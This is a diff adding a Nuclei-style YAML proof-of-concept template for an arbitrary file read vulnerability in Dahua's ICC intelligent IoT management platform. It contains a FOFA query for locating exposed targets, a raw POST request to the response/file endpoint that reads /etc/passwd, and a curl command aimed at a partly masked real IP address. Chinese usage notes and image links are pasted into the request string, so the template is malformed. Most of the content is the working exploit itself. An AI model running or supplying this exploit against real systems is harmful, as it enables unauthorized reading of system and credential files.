@@ -1,0 +1,19 @@
+id: poc-avg7u2tkxqt0fmg0
+info:
+  name: 大华ICC智能物联综合管理平台 response_file 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/avg7u2tkxqt0fmg0'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: avg7u2tkxqt0fmg0
+    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+http:
+- raw:
+  - "POST /evo-runs/v1.0/receive/response/file HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0\nContent-Type: application/json\n\n{\"method\":\"agent.module.log.file\",\"info\":{\"list\":[{\"fileName\":\"1.txt\",\"path\":\"/etc/passwd\",\"serverIp\":\"[127.0.0.1]\"}]}}![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583196639-42353597-7192-4e3e-9c33-d13f8009f5cc.png)\n读取到是个压缩包，yakit重放会损坏压缩包，建议使用linux服务器curl读取文件\n\ncurl -k -X POST \"https://39.xx.xx.55:447/evo-runs/v1.0/receive/response/file\" \\\n  -H \"Host: 39.xx.xx.55:447\" \\\n  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"method\":\"agent.module.log.file\",\"info\":{\"list\":[{\"fileName\":\"1.txt\",\"path\":\"/etc/passwd\",\"serverIp\":\"[127.0.0.1]\"}]}}' \\\n  -o response.zip\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583196902-cd6ef8df-1652-468c-adbc-5d46bec5aa72.png)\n查看内容\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583197113-70c079a1-ed35-4ec4-8f8e-2a8aa2a75d5a.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
